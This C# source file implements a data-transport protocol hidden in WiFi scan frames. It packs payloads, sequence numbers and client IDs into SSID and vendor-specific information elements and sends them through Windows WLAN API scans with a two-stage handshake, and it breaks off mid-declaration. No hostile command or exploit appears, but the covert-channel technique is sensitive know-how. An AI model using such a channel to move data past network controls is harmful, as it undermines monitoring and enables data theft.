using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NWiFi
{
    public static class Helper
    {
        public static String ethaddr2str(byte[] eth)
        {
            return String.Format("{0:X2}:{1:X2}:{2:X2}:{3:X2}:{4:X2}:{5:X2}", eth[0], eth[1], eth[2], eth[3], eth[4], eth[5]);
        }


        //helper (DEBUG only, remove in production code)
        public static string bytes2hexStr(byte[] ba)
        {
            if (ba == null) return "null";
            string hex = BitConverter.ToString(ba);
            return hex.Replace("-", "");
        }
    }

    
    public class WiFiSocket//: Socket
    {
        Socket delete;

        bool Blocking = true;
        bool Connected = false;
        bool DontFragment = false;
        int ReceiveTimeout = 0;
        int SendTimeout = 0;
        int SendBufferSize = 0;

        

        public const int MTU_WITH_VEN_IE = Packet.SSID_PAYLOAD_MAX_LEN + Packet.VEN_IE_PAYLOAD_MAX_LEN;
        public const int MTU_WITHOUT_VEN_IE = Packet.SSID_PAYLOAD_MAX_LEN;

        public int MTU = WiFiSocket.MTU_WITHOUT_VEN_IE;
        public bool txVenIeWorking = false;
        public bool rxVenIeWorking = false;
        public byte clientID = 0;
        public byte[] clientIV = null;

        public WiFiSocket()//: base(SocketType.Stream, ProtocolType.IP)
        {
            
        }

        public bool Connect(IntPtr nativeWiFiClientHandle, Guid if_guid, byte[] target = null)
        {
            
            

#if DEBUG
            Console.WriteLine("Entering init_connection()");
            Console.WriteLine("Requesting stage 1 ...");
#endif
            Packet stage1request = new Packet();

            //Stage 1 (packet with payload in SSID only)
            Random rnd = new Random(); //PSN seeded by system clock
            this.clientIV = new byte[4];
            rnd.NextBytes(this.clientIV);

            stage1request.ssid_payload = this.clientIV;
            stage1request.ie_vendor_payload = this.clientIV;
            stage1request.FlagInitConnection = true;
            //We are using a payload in the vendor IE and are indicating this in a header field in SSID
            //in case the vendor IE gets lost, the server is able to recognize this and communicate it back (sets Flag ReceivedVenIe to false in response)
            stage1request.FlagIncludedVenIe = true;
            stage1request.seq = 1;

            bool stage1finished = false;
            while (!stage1finished)
            {
                Packet[] recv = Client.SendRecv(nativeWiFiClientHandle, if_guid, stage1request, true); //The last boolean parameter forces the scan to finish, before the method returns
                if (recv != null)
                {
                    foreach (Packet stage1response in recv)
                    {


                        //The received stage 1 connection response has to meet the following conditions
                        // - init connection flag is set
                        // - ACK == 1, packets with different ack are dropped
                        // - reflects the random number which has been used in request in ssid_payload !IMPORTANT to distinguish from other clients initiating connections!
                        // - if a) FlagReceivedVenIe == true, we know we can use a vendor specific IE to transmit (additional 235 bytes per scan)
                        //      b) FlagReceivedVenIe == false, we can't use the vendor IE for tx and are stuck on ssid (only 27 bytes, without header data)
                        // - if a) ven_ie_raw_data == null (and FlagIncludedVenIe == true) the vendor specific IE from the server doesn't made it through
                        //      and we are stuck to 27 bytes SSID payload in rx, the server has to be informed about this in a final packet (with FlagReceivedVenIe=false)
                        //      b) ven_ie_raw_data != null (and FlagIncludedVenIe == true) the vendor specific IE from the server made it through
                        //      and we are able to receive additional 235 bytes in rx, the server has to be informed about this in a final packet (with FlagReceivedVenIe=true)
                        // - FlagIncludedVenIe has to be true in the server response, everything else is invalid
                        // - the clientID field is set to the ID which we are allowed to use

                        //So at this point we (the client) have:
                        //  - a valid seq (next is 2)
                        //  - we know if we are allowed to transmit with vendor IE
                        //  - we know if we are able to receive with vendor IE (but the server doesn't know this)
                        //  - we know our clientId (which has to be used in all followin tx packets

                        //At this point the remote endpoint (the server):
                        // - doesn't know if we are able to receive vendor IEs
                        // - doesn't know if we received our clientId
                        // - doesn't know if we are aware of his response at all (if we know the seq he used)
                        // - hasn't accepted our connection (a dedicated socket has to be handled for every client on the remote end)
                        // Thus a stage 2 packet is sent from client to server, with:
                        // - ack set to the seq received from the server in stage 1 response
                        // - client ID set to the client ID received in stage 1 response
                        // - the FlagReceivedVenIe set to true, in case we received a vendor IE in stage 1 response, otherwise set to false
                        // - FlagInitConnection set to true, as we're still initiating the connection

                        //When the server receives the stage 2 connection request, he creates a new socket and add it to the accept queue
                        //This means the accept() method has to be called on the other end, to ultimately establish the connection (indicated by a valid
                        // stage 2 response packet). It is possible that this stage2 response never arrives. Before falling back to stage 1 (in order to 
                        //re-establish the connection, f.e. based on a timeout), a packet with FlagResetConnection set to true and the already
                        // occupied clientID has to be send to the server.


                        if (!stage1response.FlagInitConnection) continue; //next packet
                        if (!stage1response.FlagIncludedVenIe) continue; //Invalid, server always tries to include vendor IE in connection init, continue with next packet
                        if (stage1response.ack != 1) continue; //next packet
                        bool rnd_valid = true;
                        for (int i = 0; i < this.clientIV.Length; i++)
                        {
                            if (this.clientIV[i] != stage1response.ssid_payload[i])
                            {
                                rnd_valid = false;
                                break;
                            }
                        }
                        if (!rnd_valid) continue; //next packet
                        if (stage1response.clientId == 0) continue; //ClientID 0 is reserved
                        if (stage1response.FlagReceivedVenIe)
                        {
                            this.txVenIeWorking = true; //We're able to transmit with vendor specific IE
                            this.MTU = WiFiSocket.MTU_WITH_VEN_IE;
                        }
                        else
                        {
                            this.txVenIeWorking = false; //We aren't able to transmit with vendor specific IE
                            this.MTU = WiFiSocket.MTU_WITHOUT_VEN_IE;
                        }
                        if (stage1response.ie_vendor_payload != null) this.rxVenIeWorking = true; //ToDo: payload should better be testet  to contain random_id
                        this.clientID = stage1response.clientId;
#if DEBUG
                        Console.WriteLine("Stage1 response received");
                        stage1response.print_out();
#endif
                        stage1finished = true;
                    }
                }
#if DEBUG
                else Console.WriteLine("Nothing received\n");
#endif
            }
#if DEBUG
            Console.WriteLine("Requesting stage 2 ...");
#endif
            Packet stage2request = new Packet();
            stage2request.ssid_payload = this.clientIV;
            stage2request.ie_vendor_payload = this.clientIV;
            stage2request.FlagInitConnection = true;
            stage2request.FlagIncludedVenIe = true;
            stage2request.clientId = this.clientID;
            stage2request.seq = 2;

            bool stage2finished = false;
            while (!stage2finished) //ToDo: ...and no connection reset received
            {
                Packet[] recv = Client.SendRecv(nativeWiFiClientHandle, if_guid, stage2request, true); //The last boolean parameter forces the scan to finish, before the method returns
                if (recv != null)
                {
                    foreach (Packet stage2response in recv)
                    {



                        if (!stage2response.FlagInitConnection) continue; //next packet
                        if (!stage2response.FlagIncludedVenIe) continue; //Invalid, server always tries to include vendor IE in connection init, continue with next packet
                        if (stage2response.ack != 2) continue; //next packet
                        bool rnd_valid = true;
                        for (int i = 0; i < this.clientIV.Length; i++)
                        {
                            if (this.clientIV[i] != stage2response.ssid_payload[i])
                            {
                                rnd_valid = false;
                                break;
                            }
                        }
                        if (!rnd_valid) continue; //next packet
                        if (stage2response.clientId == 0) continue; //ClientID 0 is reserved
                        if (stage2response.clientId != this.clientID) continue;
                        if (stage2response.FlagReceivedVenIe) txVenIeWorking = true; //We're able to transmit with vendor specific IE
                        if (stage2response.ie_vendor_payload != null) rxVenIeWorking = true; //ToDo: payload should better be testet  to contain random_id

                        
#if DEBUG
                        Console.WriteLine("Stage2 response");
                        stage2response.print_out();
#endif
                        stage2finished = true;
                    }

                    
                }
#if DEBUG
                else Console.WriteLine("Nothing received\n");
#endif
            }

            return true;
        }

        public int Receive(byte[] buffer)
        {

            return 0;
        }

        public int Send(byte[] buffer, int size)
        {

            return 0;
        }

        void Disconnect()
        {

        }
    }

    public class Packet2
    {
        byte[] sa = null; //80211 SA
        byte[] da = null; //80211 DA
        byte clientID = 0; //logical source (as we use scanning, on some devices the 802.11 SA could change and isn't reliable)
        byte srvID = 0; //logical destination
        byte[] pay1 = null; //encoded in SSID
        byte[] pay2 = null; //encoded in vendor IE (optional, only if possible)
        byte seq = 0;
        byte ack = 0;
        //len_pay1/len_pay2 not needed, represented by pay1.Length/pay2.length, but has to be encoded in packet
        //byte len_pay1 = 0; //netto length of payload 1
        //byte len_pay2 = 0; //netto length of payload 2

        //cheksums aren't stored, only calculated between checks
        //byte chk_pay1 = 0; //8 bit checksum for pay1
        //byte chk_pay2 = 0; //8 bit checksum for pay2

        bool FlagControlMessage = false; //If set, the payload contains a control message, pay1[0] is control message type
        byte ctlm_type = 0;

        //not needed, vendor IE tx/rx capabilities are checked during connection initialization
        //bool FlagCarriesPay2 = false; //if true, the packet gets/was transmitted with a vendor IE (pay2) included, which could maybe get lost
        //bool FlagAckPay2 = false; //if true, the packet gets/was transmitted with a vendor IE (pay2) included, which could maybe get lost

        public const byte CTLM_TYPE_CON_INIT_REQ1 = 1;
        public const byte CTLM_TYPE_CON_INIT_RSP1 = 2;
        public const byte CTLM_TYPE_CON_INIT_REQ2 = 3;
        public const byte CTLM_TYPE_CON_INIT_RSP2 = 4;
        public const byte CTLM_TYPE_CON_RESET = 5;


        /*
         * Data encoding
         * 
         * SSID - 32 BYTES (pay1)
         * ----------------------
         * byte 0: pay1[0], if FlagControlMessage is set CTRL_TYPE
         * byte 1..27: pay1[0..27]
         * byte 28 ack_seq bits: 0..3 = ack, 4..7 = seq
         * byte 29 flag_len bits: 0 = FlagControlMessage, 1 = reserved, 2 = reserved, 3-7 = len_pay1
         * byte 30 clientID_srvID bits: 0..3 = clientID, 4..7 = srvID
         * byte 31 chk_pay1: 8 bit checksum
         * 
         * Vendor Specific IE - 238 BYTES (pay2), could be missing
         * -----------------------------------------------------
         * 
         * byte 0..235 pay2
         * byte 236 len_pay2: 
         * byte 237 chk_pay2: 8 bit checksum
         * 
         */

        public Packet2()
        {
            this.sa = new byte[6];
            this.da = new byte[6];
        }

        public static Packet2 parse2packet(byte[] sa, byte[] da, byte[] raw_ssid_data, byte[] raw_ven_ie_data = null)
        {
            Packet2 packet = new Packet2();
            packet.sa = sa;
            packet.da = da;
            
            
            if (raw_ven_ie_data != null)
            {
                byte pay2_len = raw_ven_ie_data[236];
                packet.pay2 = new byte[pay2_len];
                Array.Copy(raw_ven_ie_data, packet.pay2, pay2_len);
            }

            byte ack_seq = raw_ssid_data[28];
            packet.ack = (byte) (ack_seq >> 4);
            packet.seq = (byte)(ack_seq & 0x0F);

            byte flag_len = raw_ssid_data[29];
            packet.FlagControlMessage = ((flag_len & 0x80) != 0);
            if (packet.FlagControlMessage) packet.ctlm_type = raw_ssid_data[0];
            byte pay1_len = (byte) (flag_len & 0x1F);
            packet.pay1 = new byte[pay1_len];
            Array.Copy(raw_ssid_data, packet.pay1, pay1_len);

            byte clientID_srvID = raw_ssid_data[30];
            packet.clientID = (byte)(clientID_srvID >> 4);
            packet.srvID = (byte)(clientID_srvID & 0x0F);

            return packet;
        }

        public byte[] generateRawSsid(bool with_TL = false)
        {
            byte[] res = new byte[32];

            if (this.FlagControlMessage)
            {
                //assure CTLM_TYPE is set in first payload field
                if (this.pay1 == null) pay1 = new byte[1];
                pay1[0] = this.ctlm_type;
            }

            //Copy in payload (truncate)
            if (this.pay1 == null)
            {
                Console.WriteLine("Error generating raw SSID, no payload defined");
                return null;
            }
            byte pay1_len = (byte) Math.Min(28, this.pay1.Length);
            Array.Copy(this.pay1, res, pay1_len); //gets truncated to payload max len, is already padded with zeros

            // build ack_seq
            byte ack_seq = (byte)((this.ack << 4) | (this.seq & 0x0F));
            res[28] = ack_seq;

            //build flag_len
            byte flag_len = pay1_len;
            if (this.FlagControlMessage) flag_len += 0x80;
            res[29] = flag_len;

            //build clientID_srvID
            byte clientID_srvID = (byte)((this.clientID << 4) | (this.srvID & 0x0F));
            res[30] = clientID_srvID;

            //build chksum
            res[31] = simpleChecksum8(res, 31);


            if (with_TL)
            {
                //prepend TL
                byte[] tmp = res;
                res = new byte[tmp.Length + 2];
                Array.Copy(tmp, 0, res, 2, tmp.Length);
                res[0] = (byte)0x00; //Type SSID
                res[1] = (byte)Packet.SSID_RAW_LEN; //Length 32
            }
            return res;
        }

        public byte[] generateRawVenIe(bool with_TL = true)
        {

            //Copy in payload (truncate)
            if (this.pay2 == null)
            {
                Console.WriteLine("Error generating raw venIe, no payload defined");
                return null;
            }

            byte[] res = new byte[238];
            byte pay2_len = (byte) Math.Min(236, pay2.Length);

            Array.Copy(this.pay2, res, pay2_len); //gets truncated to payload max len, is already padded with zeros

            //build len octet
            res[236] = pay2_len;

            //calculate checksum
            res[237] = simpleChecksum8(res, 237);

            if (with_TL)
            {
                //prepend TL
                byte[] tmp = res;
                res = new byte[tmp.Length + 2];
                Array.Copy(tmp, 0, res, 2, tmp.Length);
                res[0] = (byte)221; //Type Custom Vendor IE
                res[1] = (byte)238; //IE Length 238
            }
            return res;
        }

        public static bool checkLengthChecksum(byte[] raw_ssid_data, byte[] raw_ven_ie_data = null)
        {
            //desired length raw_ssid_data == 32, raw_ven_ie_data == 238 (noth without IE type and IE length)
            //checksums are calculated up to the chk_pay1/chk_pay2 field: raw_ssid_data[0..30]/raw_ven_ie_data[0..236]

            //check length of SSID field
            if (raw_ssid_data.Length != 32) return false;

            //chksum of SSID
            byte chk = Packet2.simpleChecksum8(raw_ssid_data, 31);
            if (chk != raw_ssid_data[31]) return false;

            //if raw_venIe is present, check length and chksum
            if (raw_ven_ie_data != null)
            {
                //check length
                if (raw_ven_ie_data.Length != 238) return false;

                //chksum of SSID
                chk = Packet2.simpleChecksum8(raw_ven_ie_data, 237);
                if (chk != raw_ven_ie_data[237]) return false;
            }

            return true;
        }

        public void print_out()
        {
#if DEBUG
            String s = "";
            s += String.Format("Packet\n");
            s += String.Format("\tSA:\t{0}\n", Helper.ethaddr2str(this.sa));
            s += String.Format("\tDA:\t{0}\n", Helper.ethaddr2str(this.da));

            s += String.Format("\tclientID:\t{0}\n", this.clientID);
            s += String.Format("\tsrvID:\t{0}\n", this.srvID);

            s += String.Format("\tSSID payload len:\t{0}\n", this.pay1.Length);
            s += String.Format("\tSSID payload:\t{0}\n", Helper.bytes2hexStr(this.pay1));
            if (this.pay2 == null)
                s += String.Format("\tVendor IE raw:\t{0}\n", "null");
            else
            {
                s += String.Format("\tVendor IE  payload len:\t{0}\n", this.pay2.Length);
                s += String.Format("\tVendor IE  payload:\t{0}\n", Helper.bytes2hexStr(this.pay2));
            }
            s += String.Format("\tFlag Control Message:\t{0}\n", this.FlagControlMessage);
            if (this.FlagControlMessage)
                s += String.Format("\tCTLM_TYPE:\t{0}\n", this.ctlm_type);
            s += String.Format("\tSEQ:\t{0}\n", this.seq);
            s += String.Format("\tACK:\t{0}\n", this.ack);

            Console.WriteLine(s);
#endif
        }


        public static byte[] simpleChecksum16(byte[] input, int len = -1)
        {
            UInt16 sum = 0;
            int off = 0;

            if (len == -1) len = input.Length; //Calculate for full array


            for (off = 0; off < len; off++)
            {
                sum += input[off];
                sum &= 0xFFFF; //shouldn't be needed
            }

            sum = (UInt16)~sum;

            byte[] res = new byte[2];
            res[0] = (byte)((sum & 0xFF00) >> 8);
            res[1] = (byte)(sum & 0x00FF);
            return res;
        }

        public static byte simpleChecksum8(byte[] input, int len = -1)
        {
            byte sum = 0;
            int off = 0;

            if (len == -1) len = input.Length; //Calculate for full array
            
            for (off = 0; off < len; off++) sum += input[off];

            return (byte)~sum;
        }
    }


    public class Packet
    {
        public const byte SSID_PAYLOAD_MAX_LEN = 27;
        public const byte SSID_RAW_LEN = 32;

        //byte 0-26
        public const byte SSID_OFFSET_PAYLOAD = 0;
        //byte 27
        public const byte SSID_OFFSET_FLAGS_SEQ = 27; //bits 0-3 flags (0: INCLUDED_VEN_IE, 1: INIT_CONNECTION, 2-3 reserved), bits 4-7 SEQ
        //byte 28
        public const byte SSID_OFFSET_FLAGS_ACK = 28; //bits 0-3 flags (0: RECEIVED_VEN_IE, 1: RESET_CONNECTION, 2-3 reserved), bits 4-7 ACK
        //byte 29
        /*
        * Note:
        * A client ID is introduced to disinguish between multiple clients which connect.
        * Of course, the source address of the probing WiFi station could be used, but to be "future-proof"
        * we keep in mind, that there're WiFi implementations out there, which change the MAC address while
        * probing for APs, so we don't rely on this possible client identifier and use our own ;-)
        * 
        * As we use only 3 bits for the client ID, we are limited to seven clients (client ID zero is used for new inbound connections).
        * The maximum payload lentgh which could be used is 27, values 27-31 are invalid
        */
        public const byte SSID_OFFSET_LEN_ID = 29; //bits 0-4 payload length, bits 5-7 Client ID 
        //byte 30,31
        public const byte SSID_OFFSET_CHKSM = 30;


        //Shifts/Masks for SSID data
        public const byte SSID_MASK_CLIENT_ID = 0x07;
        public const byte SSID_MASK_SEQ = 0x0F;
        public const byte SSID_MASK_ACK = 0x0F;
        public const byte SSID_MASK_INCLUDED_VEN_IE = 0x80;
        public const byte SSID_MASK_INIT_CONNECTION = 0x40;
        public const byte SSID_MASK_RECEIVED_VEN_IE = 0x80;
        public const byte SSID_MASK_RESET_CONNECTION = 0x40;

        public const byte SSID_SHIFT_LEN = 3;



        public const byte VEN_IE_PAYLOAD_MAX_LEN = 235;
        public const byte VEN_IE_RAW_LEN = 238;

        //byte 0-234
        public const byte VEN_IE_OFFSET_PAYLOAD = 0;
        //byte 235 - length field consumes a full byte (max: VEN_IE_PAYLOAD_MAX_LEN)
        public const byte VEN_IE_OFFSET_LEN = 235;
        //byte 236, 237
        public const byte VEN_IE_OFFSET_CHKSM = 236;


        public byte[] ssid_raw_data  = null;
        public byte[] ven_ie_raw_data = null;


        
        //public byte[] ven_ie_payload = null;

        public byte[] sa = null;
        public byte[] da = null;
        public byte ssid_len = 0;
        public byte ie_vendor_len = 0;


        // ***** SSID IE DATA *****
        public byte[] ssid_payload = null;

        // FLAGS_SEQ
        public bool FlagIncludedVenIe = false;
        public bool FlagInitConnection = false;
        public byte seq = 0;

        // FLAGS_ACK
        public bool FlagReceivedVenIe = false;
        public bool FlagResetConnection = false;
        public byte ack = 0;

        // LEN_ID
        public byte payload_len_ssid = 0;
        public byte clientId = 0;
        // **** end SSID IE DATA ****

        // *** Vendor IE data ***
        public byte[] ie_vendor_payload = null;
        public byte payload_len_ven_ie = 0;

        public Packet()
        {

        }

        public void print_out()
        {
#if DEBUG
            String s = "";
            s += String.Format("Packet\n");
            s += String.Format("\tSA:\t{0}\n", Helper.ethaddr2str(this.sa));
            s += String.Format("\tDA:\t{0}\n", Helper.ethaddr2str(this.da));
            s += String.Format("\tSSID raw:\t{0}\n", Helper.bytes2hexStr(this.ssid_raw_data));
            s += String.Format("\tSSID payload len:\t{0}\n", this.payload_len_ssid);
            s += String.Format("\tSSID payload:\t{0}\n", Helper.bytes2hexStr(this.ssid_payload));
            if (this.ven_ie_raw_data == null)
                s += String.Format("\tVendor IE raw:\t{0}\n", "null");
            else
            {
                s += String.Format("\tVendor IE raw:\t{0}\n", Helper.bytes2hexStr(this.ven_ie_raw_data));
                s += String.Format("\tVendor IE  payload len:\t{0}\n", this.payload_len_ven_ie);
                s += String.Format("\tVendor IE  payload:\t{0}\n", Helper.bytes2hexStr(this.ie_vendor_payload));
            }
            s += String.Format("\tFlag vendor IE included:\t{0}\n", this.FlagIncludedVenIe);
            s += String.Format("\tFlag init connection:\t{0}\n", this.FlagInitConnection);
            s += String.Format("\tSEQ:\t{0}\n", this.seq);

            s += String.Format("\tFlag vendor IE received:\t{0}\n", this.FlagReceivedVenIe);
            s += String.Format("\tFlag reset connection:\t{0}\n", this.FlagResetConnection);
            s += String.Format("\tACK:\t{0}\n", this.ack);
            //Console.WriteLine(String.Format("Packet accepted, SSID {0}", Helper.bytes2hexStr(in_ssid)));

            Console.WriteLine(s);
#endif
        }

        public static bool filterLengthChecksum(byte[] raw_ssid_data, byte[] raw_ven_ie_data = null)
        {
            //check length of SSID field
            if (raw_ssid_data.Length != Packet.SSID_RAW_LEN) return false;

            //chksum of SSID
            byte[] chk = Packet.simpleChecksum16(raw_ssid_data, Packet.SSID_OFFSET_CHKSM);
            if ((chk[0] != raw_ssid_data[Packet.SSID_OFFSET_CHKSM]) ||
                (chk[1] != raw_ssid_data[Packet.SSID_OFFSET_CHKSM + 1]))
                return false;

            //if raw_venIe is present, check length and chksum
            if (raw_ven_ie_data != null)
            {
                //check length
                if (raw_ven_ie_data.Length != Packet.VEN_IE_RAW_LEN) return false;

                //chksum of SSID
                chk = Packet.simpleChecksum16(raw_ven_ie_data, Packet.VEN_IE_OFFSET_CHKSM);
                if ((chk[0] != raw_ven_ie_data[Packet.VEN_IE_OFFSET_CHKSM]) ||
                    (chk[1] != raw_ven_ie_data[Packet.VEN_IE_OFFSET_CHKSM + 1]))
                    return false;
            }

            return true;
        }

        public static Packet parse2packet(byte[] sa, byte[] da, byte[] raw_ssid_data, byte[] raw_ven_ie_data=null)
        {
            Packet packet = new Packet();
            packet.sa = sa;
            packet.da = da;
            packet.ssid_len = (byte) raw_ssid_data.Length;
            packet.ssid_raw_data = raw_ssid_data;
            if (raw_ven_ie_data != null)
            {
                packet.ie_vendor_len = (byte) raw_ven_ie_data.Length;
                packet.ven_ie_raw_data = raw_ven_ie_data;
                
                packet.payload_len_ven_ie = Math.Min(packet.ven_ie_raw_data[Packet.VEN_IE_OFFSET_LEN], Packet.VEN_IE_PAYLOAD_MAX_LEN);
                packet.ie_vendor_payload = new byte[packet.payload_len_ven_ie];
                Array.Copy(raw_ven_ie_data, packet.ie_vendor_payload, packet.payload_len_ven_ie);
            }

            byte flag_seq = raw_ssid_data[Packet.SSID_OFFSET_FLAGS_SEQ];
            packet.FlagIncludedVenIe = (flag_seq & Packet.SSID_MASK_INCLUDED_VEN_IE) > 0;
            packet.FlagInitConnection = (flag_seq & Packet.SSID_MASK_INIT_CONNECTION) > 0;
            packet.seq = (byte) (flag_seq & Packet.SSID_MASK_SEQ);

            byte flag_ack = raw_ssid_data[Packet.SSID_OFFSET_FLAGS_ACK];
            packet.FlagReceivedVenIe = (flag_ack & Packet.SSID_MASK_RECEIVED_VEN_IE) > 0;
            packet.FlagResetConnection = (flag_ack & Packet.SSID_MASK_RESET_CONNECTION) > 0;
            packet.ack = (byte)(flag_ack & Packet.SSID_MASK_ACK);

            packet.payload_len_ssid = (byte)((raw_ssid_data[Packet.SSID_OFFSET_LEN_ID] & (~Packet.SSID_MASK_CLIENT_ID)) >> Packet.SSID_SHIFT_LEN);
            packet.clientId = (byte)(raw_ssid_data[Packet.SSID_OFFSET_LEN_ID] & Packet.SSID_MASK_CLIENT_ID);
            packet.payload_len_ssid = Math.Min(Packet.SSID_PAYLOAD_MAX_LEN, packet.payload_len_ssid);
            packet.ssid_payload = new byte[packet.payload_len_ssid];
            Array.Copy(raw_ssid_data, packet.ssid_payload, packet.payload_len_ssid);

            return packet;
        }

        public byte[] generateRawSsid(bool with_TL=false)
        {
            byte[] res = new byte[Packet.SSID_RAW_LEN]; ;

            //Copy in payload (truncate)
            if (this.ssid_payload == null)
            {
                Console.WriteLine("Error generating raw SSID, no payload defined");
                return null;
            }
            Array.Copy(this.ssid_payload, res, this.ssid_payload.Length); //gets truncated to payload max len, is already padded with zeros

            // build flag_seq octet
            byte flag_seq = this.seq;
            if (this.FlagIncludedVenIe) flag_seq += Packet.SSID_MASK_INCLUDED_VEN_IE;
            if (this.FlagInitConnection) flag_seq += Packet.SSID_MASK_INIT_CONNECTION;
            res[Packet.SSID_OFFSET_FLAGS_SEQ] = flag_seq;

            // build flag_ack octet
            byte flag_ack = this.ack;
            if (this.FlagReceivedVenIe) flag_ack += Packet.SSID_MASK_RECEIVED_VEN_IE;
            if (this.FlagResetConnection) flag_ack += Packet.SSID_MASK_RESET_CONNECTION;
            res[Packet.SSID_OFFSET_FLAGS_ACK] = flag_ack;

            //build len_id octet
            byte len_id = (byte) this.ssid_payload.Length;
            if (len_id > Packet.SSID_PAYLOAD_MAX_LEN) len_id = Packet.SSID_PAYLOAD_MAX_LEN; //account for truncation
            len_id = (byte) (len_id << Packet.SSID_SHIFT_LEN);
            len_id += this.clientId;
            res[Packet.SSID_OFFSET_LEN_ID] = len_id;

            //calculate checksum
            byte[] chk = simpleChecksum16(res, SSID_OFFSET_CHKSM);
            res[SSID_OFFSET_CHKSM] = chk[0];
            res[SSID_OFFSET_CHKSM + 1] = chk[1];

            if (with_TL)
            {
                //prepend TL
                byte[] tmp = res;
                res = new byte[tmp.Length + 2];
                Array.Copy(tmp, 0, res, 2, tmp.Length);
                res[0] = (byte) 0x00; //Type SSID
                res[1] = (byte) Packet.SSID_RAW_LEN; //Length 32
            }
            return res;
        }

        public byte[] generateRawVenIe(bool with_TL = false)
        {
            
            //Copy in payload (truncate)
            if (this.ie_vendor_payload == null)
            {
                Console.WriteLine("Error generating raw venIe, no payload defined");
                return null;
            }

            byte[] res = new byte[Packet.VEN_IE_RAW_LEN];

            Array.Copy(this.ie_vendor_payload, res, this.ie_vendor_payload.Length); //gets truncated to payload max len, is already padded with zeros

            //build len octet
            byte len = (byte) this.ie_vendor_payload.Length;
            if (len > Packet.VEN_IE_PAYLOAD_MAX_LEN) len = Packet.VEN_IE_PAYLOAD_MAX_LEN; //account for truncation
            res[Packet.VEN_IE_OFFSET_LEN] = len;

            //calculate checksum
            byte[] chk = simpleChecksum16(res, Packet.VEN_IE_OFFSET_CHKSM);
            res[VEN_IE_OFFSET_CHKSM] = chk[0];
            res[VEN_IE_OFFSET_CHKSM + 1] = chk[1];

            if (with_TL)
            {
                //prepend TL
                byte[] tmp = res;
                res = new byte[tmp.Length + 2];
                Array.Copy(tmp, 0, res, 2, tmp.Length);
                res[0] = (byte) 221; //Type Custom Vendor IE
                res[1] = (byte)Packet.VEN_IE_RAW_LEN; //Length 32
            }
            return res;
        }
                
        public static byte[] simpleChecksum16(byte[] input, int len = -1)
        {
            UInt16 sum = 0;
            int off = 0;

            if (len == -1) len = input.Length; //Calculate for full array


            for (off = 0; off < len; off++)
            {
                sum += input[off];
                sum &= 0xFFFF; //shouldn't be needed
            }

            sum = (UInt16)~sum;

            byte[] res = new byte[2];
            res[0] = (byte)((sum & 0xFF00) >> 8);
            res[1] = (byte)(sum & 0x00FF);
            return res;
        }
    }
 
    public static class Client
    {
        
        private const UInt32 CL_VER_GT_XP = 2; //Version greater XP SP2 (Support for pleData + SSID on scan)
        private static AutoResetEvent waitScanComplete = new AutoResetEvent(false);

        //WLAN_INTERFACE_STATE enum
        public enum WlanInterfaceState
        {
            NotReady = 0,
            Connected = 1,
            AdHocNetworkFormed = 2,
            Disconnecting = 3,
            Disconnected = 4,
            Associating = 5,
            Discovering = 6,
            Authenticating = 7
        }

        public enum Dot11BssType
        {
            Infrastructure = 1,
            Independent = 2,
            Any = 3
        }

        public enum Dot11PhyType : uint
        {
            Unknown = 0,
            Any = Unknown,
            FHSS = 1,
            DSSS = 2,
            IrBaseband = 3,
            OFDM = 4,
            HRDSSS = 5,
            ERP = 6,
            IHV_Start = 0x80000000,
            IHV_End = 0xffffffff
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RAW_IE_DATA
        {
            /// DWORD->unsigned int
            public uint dwDataSize;

            /// UCHAR[]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 240)] //max length for data pointed to by pIeData
            public byte[] dataBlob;
        }


        //first part of _WLAN_INTERFACE_INFO_LIST
        [StructLayout(LayoutKind.Sequential)]
        internal struct WlanInterfaceInfoListHeader
        {
            public uint numberOfItems;
            public uint index;
            //Continues with WLAN_INTERFACE_INFO[] (numberOfItems elements) 
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct WlanBssListHeader
        {
            internal uint totalSize;
            internal uint numberOfItems;
        }

        //WLAN_INTERFACE_INFO struct
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WlanInterfaceInfo
        {
            public Guid interfaceGuid;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string interfaceDescription;
            public WlanInterfaceState isState;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct WlanRateSet
        {
            private uint rateSetLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 126)]
            private ushort[] rateSet;
            public ushort[] Rates
            {
                get
                {
                    ushort[] rates = new ushort[rateSetLength / sizeof(ushort)];
                    Array.Copy(rateSet, rates, rates.Length);
                    return rates;
                }
            }
            public double GetRateInMbps(int rateIndex)
            {
                if ((rateIndex < 0) || (rateIndex > rateSet.Length)) throw new ArgumentOutOfRangeException("rateIndex");
                return (rateSet[rateIndex] & 0x7FFF) * 0.5;
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct WlanBssEntry
        {
            public DOT11_SSID dot11Ssid;
            public uint phyId;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public byte[] dot11Bssid;
            public Dot11BssType dot11BssType;
            public Dot11PhyType dot11BssPhyType;
            public int rssi;
            public uint linkQuality;
            public bool inRegDomain;
            public ushort beaconPeriod;
            public ulong timestamp;
            public ulong hostTimestamp;
            public ushort capabilityInformation;
            public uint chCenterFrequency;
            public WlanRateSet wlanRateSet;
            public IntPtr ieOffset;
            public uint ieSize;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct DOT11_SSID
        {
            /// ULONG->unsigned int
            public uint uSSIDLength;

            /// UCHAR[]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public byte[] ucSSID;
        }


        [DllImport("Wlanapi", EntryPoint = "WlanEnumInterfaces")]
        public static extern uint WlanEnumInterfaces([In] IntPtr hClientHandle, IntPtr pReserved, out IntPtr ppInterfaceList);

        [DllImport("wlanapi.dll")]
        public static extern int WlanOpenHandle(
            [In] UInt32 clientVersion,
            [In, Out] IntPtr pReserved,
            [Out] out uint negotiatedVersion,
            [Out] out IntPtr clientHandle);

        [DllImport("Wlanapi", EntryPoint = "WlanCloseHandle")]
        public static extern uint WlanCloseHandle([In] IntPtr hClientHandle, IntPtr pReserved);

        [DllImport("Wlanapi.dll", SetLastError = true)]
        public static extern uint WlanScan(
            IntPtr hClientHandle, 
            ref Guid pInterfaceGuid, 
            IntPtr pDot11Ssid, //not for XP SP2 or earlier
